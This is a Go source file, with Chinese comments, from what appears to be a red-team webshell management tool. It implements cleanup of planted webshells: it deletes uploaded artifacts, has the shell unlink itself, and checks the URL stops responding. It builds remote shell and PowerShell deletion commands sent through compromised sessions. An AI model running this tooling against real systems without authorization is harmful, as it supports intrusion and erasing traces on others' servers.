package webshell

// 受管清理：把一条会话在马上的落地物删干净，再摘登记。
//
// 语义（刻意保守）：
//   - 默认只摘登记，不动远端。马留不留由人决定，工具不替人做主——演练中
//     「留着下轮用」是常见需求，误删会让下一次进不来。
//   - remove_remote=true 才动远端：删 remote_path 指向的马 → 删经本平台
//     upload 写上去的 artifacts → 再请求一次 URL 复查打不通 → 才摘登记。
//   - 远端没清干净会报错并保留登记；确认要丢弃登记得显式 force=true。
//
// 顺序不能反：自删会把马本身删掉，之后任何清理命令都发不出去了。所以先清
// artifacts，最后一步才是自删，自删之后只做「打不通」复查。

import (
	"context"
	"strings"
	"time"
)

// PurgeOptions 是清理的输入。
type PurgeOptions struct {
	// RemoveRemote 为真才动远端落地物。
	RemoveRemote bool
	// Force 为真时即使复查失败也摘登记。
	Force bool
	// Timeout 是单次请求超时。
	Timeout time.Duration
}

// DelItem 是一条远端落地物的删除结果。
type DelItem struct {
	Path   string `json:"path"`
	Status string `json:"status"` // deleted / kept / not_found / unknown
	Detail string `json:"detail,omitempty"`
}

// PurgeResult 是一次清理的结果。
type PurgeResult struct {
	Name string `json:"name"`
	// LocalRemoved 表示登记是否已摘除。
	LocalRemoved bool `json:"local_removed"`
	// RemoteTouched 表示是否真的动了远端。
	RemoteTouched bool      `json:"remote_touched"`
	Items         []DelItem `json:"items,omitempty"`
	// SelfPath 是这次认定的「马自身路径」。
	SelfPath string `json:"self_path,omitempty"`
	// Verified 表示复查确认原 URL 已打不通。
	Verified bool   `json:"verified"`
	Detail   string `json:"detail,omitempty"`
}

// Purge 清理一条会话。
func (m *Manager) Purge(ctx context.Context, name string, opts PurgeOptions) (PurgeResult, error) {
	sess, err := m.Get(name)
	if err != nil {
		return PurgeResult{}, err
	}
	if opts.Timeout <= 0 {
		opts.Timeout = DefaultTimeout
	}
	res := PurgeResult{Name: name}

	if !opts.RemoveRemote {
		if err := m.Remove(name); err != nil {
			return res, err
		}
		dropMode(name)
		res.LocalRemoved = true
		res.Detail = "只摘了登记，远端文件未动（要清远端请传 remove_remote=true）"
		return res, nil
	}

	res.RemoteTouched = true
	isPHP := sess.Type == "php" || sess.Type == "php_raw"

	// 1) 认定马自身路径：登记里的 remote_path 优先，否则让 PHP 自报。
	selfPath := strings.TrimSpace(sess.RemotePath)
	if selfPath == "" && isPHP {
		if p, err := runPHPCode(ctx, name, sess, phpSelfPathCode(), opts.Timeout); err == nil {
			selfPath = strings.TrimSpace(p)
		}
	}
	res.SelfPath = selfPath
	if selfPath == "" {
		res.Detail = "拿不到马自身路径（命令型马必须登记 remote_path）"
	}

	// 2) 先清 artifacts（不含自身），最后才自删。
	var artifacts []string
	for _, a := range sess.Artifacts {
		a = strings.TrimSpace(a)
		if a == "" || a == selfPath {
			continue
		}
		artifacts = append(artifacts, a)
	}
	items := make([]DelItem, 0, len(artifacts)+1)
	if len(artifacts) > 0 {
		items = append(items, m.deletePaths(ctx, name, sess, artifacts, false, opts.Timeout)...)
	}

	// 3) 删马自身。
	if selfPath != "" {
		if isPHP {
			// PHP 走 unlink。删自身这一步在「同一请求里」拿不到回执（进程把
			// 自己删了就没法 echo），所以这里只负责发出去，结果交给 ④ 复查。
			out, err := runPHPCode(ctx, name, sess, phpDeleteCode([]string{selfPath}, false), opts.Timeout)
			item := DelItem{Path: selfPath, Status: "unknown"}
			if err != nil {
				item.Detail = "删除请求失败: " + err.Error()
			} else {
				item.Status, item.Detail = parseDelOut(out, selfPath)
			}
			items = append(items, item)
			// 再补一次纯自删：前一次若因回执逻辑被远端跳过，这一次确保执行。
			_, _ = runPHPCode(ctx, name, sess, selfPathDelCode(), opts.Timeout)
		} else {
			items = append(items, m.deletePaths(ctx, name, sess, []string{selfPath}, false, opts.Timeout)...)
		}
	}
	res.Items = items

	// 4) 复查：再请求一次 URL，确认已经拿不到这条会话的标记/回环。
	if ok, detail := m.verifyGone(ctx, name, sess, opts.Timeout); ok {
		res.Verified = true
	} else {
		res.Detail = detail
	}

	// 5) 摘登记。
	if res.Verified || opts.Force {
		if err := m.Remove(name); err != nil {
			return res, err
		}
		dropMode(name)
		res.LocalRemoved = true
		if !res.Verified {
			res.Detail = "复查未通过，但按 force 丢弃了登记（远端可能仍有残留）: " + res.Detail
		}
		// 远端动作单独记一条：unregister 只知道摘了登记，审计要看到「动过远端」。
		m.emit(Event{
			Kind: "purge", Name: name, TaskID: sess.TaskID, Type: sess.Type,
			URL: redactURL(sess.URL), Remote: true, Detail: res.Detail,
		})
	} else {
		res.Detail = "远端未清干净，登记已保留（确认要丢弃请传 force=true）: " + res.Detail
	}
	return res, nil
}

// selfPathDelCode 生成「只删自己」的 PHP 代码。
func selfPathDelCode() string {
	n := varNames()
	return selfPathStmt(n) + "@unlink(" + n["p"] + ");"
}

// deletePaths 用一条命令删掉一批远端文件。
//
// PHP 会话走 unlink 而不是 shell rm：马未必有 system()，而 file_exists+unlink
// 是 PHP 自带能力，命中率高得多。命令型（jsp/aspx）只能走系统命令。
func (m *Manager) deletePaths(ctx context.Context, name string, sess Session, paths []string, includeSelf bool, timeout time.Duration) []DelItem {
	items := make([]DelItem, 0, len(paths))
	if len(paths) == 0 {
		return items
	}
	if sess.Type == "php" || sess.Type == "php_raw" {
		out, err := runPHPCode(ctx, name, sess, phpDeleteCode(paths, includeSelf), timeout)
		if err != nil {
			for _, p := range paths {
				items = append(items, DelItem{Path: p, Status: "unknown", Detail: err.Error()})
			}
			return items
		}
		// phpDeleteCode 逐行回 "DEL|b64" 或 "KEEP|b64"。
		got := map[string]DelItem{}
		for _, line := range strings.Split(out, "\n") {
			line = strings.TrimSpace(line)
			parts := strings.SplitN(line, "|", 2)
			if len(parts) != 2 {
				continue
			}
			p, derr := b64dec(parts[1])
			if derr != nil {
				continue
			}
			key := strings.TrimSpace(string(p))
			item := DelItem{Path: key}
			if strings.EqualFold(parts[0], "DEL") {
				item.Status = "deleted"
			} else {
				item.Status = "kept"
				item.Detail = "远端拒绝删除（权限或只读挂载）"
			}
			got[key] = item
		}
		for _, p := range paths {
			if it, ok := got[p]; ok {
				items = append(items, it)
			} else {
				items = append(items, DelItem{Path: p, Status: "unknown", Detail: "回执里没有这条路径"})
			}
		}
		return items
	}

	var cmd string
	if sess.Type == "aspx" {
		quoted := make([]string, 0, len(paths))
		for _, p := range paths {
			quoted = append(quoted, "'"+strings.ReplaceAll(p, "'", "''")+"'")
		}
		cmd = "powershell -nop -c \"" + strings.Join(quoted, ",") + " | ForEach-Object { " +
			"if(Test-Path $_){Remove-Item -Force $_; 'DEL|'+$_}else{'KEEP|'+$_} }\""
	} else {
		quoted := make([]string, 0, len(paths))
		for _, p := range paths {
			quoted = append(quoted, shellQuote(p))
		}
		cmd = "for f in " + strings.Join(quoted, " ") + "; do " +
			"if [ -e \"$f\" ]; then rm -f \"$f\" && echo \"DEL|$f\" || echo \"KEEP|$f\"; " +
			"else echo \"KEEP|$f\"; fi; done"
	}
	out, _, err := execCmd(ctx, name, sess, cmd, timeout)
	if err != nil {
		for _, p := range paths {
			items = append(items, DelItem{Path: p, Status: "unknown", Detail: err.Error()})
		}
		return items
	}
	status := map[string]DelItem{}
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "|", 2)
		if len(parts) != 2 {
			continue
		}
		item := DelItem{Path: parts[1]}
		if strings.EqualFold(parts[0], "DEL") {
			item.Status = "deleted"
		} else {
			item.Status = "kept"
		}
		status[parts[1]] = item
	}
	for _, p := range paths {
		if it, ok := status[p]; ok {
			items = append(items, it)
			continue
		}
		items = append(items, DelItem{Path: p, Status: "unknown", Detail: "命令回执里没有这条路径"})
	}
	return items
}

// parseDelOut 解析 PHP 删除回执（DEL|base64path 或 KEEP|base64path）。
func parseDelOut(out, want string) (string, string) {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		parts := strings.SplitN(line, "|", 2)
		if len(parts) != 2 {
			continue
		}
		p, err := b64dec(parts[1])
		if err != nil {
			continue
		}
		got := strings.TrimSpace(string(p))
		if got != strings.TrimSpace(want) {
			continue
		}
		if strings.EqualFold(parts[0], "DEL") {
			return "deleted", ""
		}
		return "kept", "远端拒绝删除（权限或只读挂载）"
	}
	return "unknown", "回执里没有这条路径"
}

// verifyGone 复查原 URL：能连上但不是我的马 → 已清干净；连不上 → 也算清干净；
// 还能拿到回环标记 → 没清掉。
func (m *Manager) verifyGone(ctx context.Context, name string, sess Session, timeout time.Duration) (bool, string) {
	token := probeEcho + "-" + randLetters(4)
	var (
		out string
		err error
	)
	if sess.Type == "php" || sess.Type == "php_raw" {
		out, err = runPHPCode(ctx, name, sess, "echo '"+token+"';", timeout)
		if err != nil {
			// 请求失败也是「打不通」，但要区分「马没了」与「网络断了」：
			// 网络断的情况无法证明清干净，保守判定为未通过。
			if isNetworkErr(err) {
				return false, "复查请求失败，无法证明已清理（网络问题？）: " + err.Error()
			}
			return true, ""
		}
		if strings.Contains(out, token) {
			return false, "马仍在响应（自删失败，可能被 open_basedir/权限拦住）"
		}
		return true, ""
	}
	out, _, err = execCmd(ctx, name, sess, "echo "+token, timeout)
	if err != nil {
		if isNetworkErr(err) {
			return false, "复查请求失败，无法证明已清理（网络问题？）: " + err.Error()
		}
		return true, ""
	}
	if strings.Contains(out, token) {
		return false, "马仍在响应（删除命令未生效）"
	}
	return true, ""
}

// isNetworkErr 判断错误是不是「连不上」类（此时不能宣告清理成功）。
func isNetworkErr(err error) bool {
	if err == nil {
		return false
	}
	s := err.Error()
	return strings.Contains(s, "连接失败") || strings.Contains(s, "请求超时") ||
		strings.Contains(s, "no such host") || strings.Contains(s, "connection refused")
}
